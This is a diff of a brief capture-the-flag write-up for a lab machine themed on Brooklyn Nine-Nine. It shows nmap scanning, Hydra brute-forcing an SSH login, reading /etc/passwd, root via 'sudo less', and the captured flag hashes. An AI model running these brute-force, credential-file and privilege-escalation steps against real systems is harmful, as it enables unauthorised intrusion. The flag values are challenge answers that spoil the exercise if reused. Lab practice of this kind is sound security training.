@@ -1,4 +1,4 @@
-                                                                                                                                                                         
+```bash  
 ┌──(kali㉿kali)-[~]
 └─$ nmap 10.10.7.39             
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 12:10 EDT
@@ -11,17 +11,17 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
-                    
+```                 
                     
 ftp 
 
-                                                                                                                                                                         
+```bash                                                           
 ┌──(kali㉿kali)-[~]
 └─$ cat note_to_jake.txt 
 From Amy,
 
 Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
-
+```
 jake:?
 
 port 80 code has hint, steghide time
@@ -29,7 +29,7 @@ port 80 code has hint, steghide time
 need passcode,,, decided to hydra and that was quick, maybe passcode is in ssh, 
 
 
-
+```bash
 ┌──(kali㉿kali)-[~/Downloads/Image-ExifTool-12.26]
 └─$ cd /hackme
                                                                                    
@@ -43,13 +43,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-22 12:24:
 [DATA] attacking ssh://10.10.7.39:22/
 [22][ssh] host: 10.10.7.39   login: jake   password: 987654321
 ^C                                        
-
+```
 
 jake:987654321
 
 
 three users
-
+```bash
 jake@brookly_nine_nine:/home$ ls
 amy  holt  jake
 
@@ -87,10 +87,10 @@ amy:x:1001:1001:,,,:/home/amy:/bin/bash
 holt:x:1002:1002:,,,:/home/holt:/bin/bash
 ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 jake:x:1000:1000:,,,:/home/jake:/bin/bash
-
+```
 
 looks like we are at the bottom
-
+```bash
 jake@brookly_nine_nine:/$ la -lah /etc/passwd
 -rw-r--r-- 1 root root 1.7K May 18  2020 /etc/passwd
 jake@brookly_nine_nine:/$ la -lah /etc/shadow
@@ -117,11 +117,11 @@ Here is the flag: 63a9f0ea7bb98050796b649e85481845
 
 Enjoy!!
 
+```
 
 sudo less gave me root and got root flag, user flag? 
 
-
-
+```bash
 # cd /home/jake
 # dir
 # ls
@@ -138,6 +138,6 @@ sudo less gave me root and got root flag, user flag?
 nano.save  user.txt
 # cat user.txt
 ee11cbb19052e40b07aac0ca060c23ee
-
+```
 
 so steghide was a rabbit hole,,,,                                     
